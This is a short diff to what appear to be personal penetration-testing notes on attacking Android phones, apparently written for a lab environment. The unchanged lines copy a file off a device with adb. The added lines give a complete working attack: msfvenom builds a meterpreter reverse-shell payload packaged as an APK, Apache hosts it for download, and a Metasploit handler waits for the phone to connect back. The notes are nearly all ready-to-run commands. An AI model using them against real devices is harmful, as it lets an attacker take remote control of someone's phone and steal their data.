@@ -7,5 +7,19 @@ adb devices -l
 adb shell
 Find the location of the file cd SD Card :: ls 
 After finding location exit shell and use pull command below to get the file to local
-
 adb pull /sdcard/Download/file.txt /home/attacker/Desktop
+
+service postgresql start
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > /home/attacker/Desktop/Backdoor.apk
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp /home/attacker/Desktop/Backdoor.apk /var/www/html/share
+service apache2 start
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+exploit -j -z or run
+
+
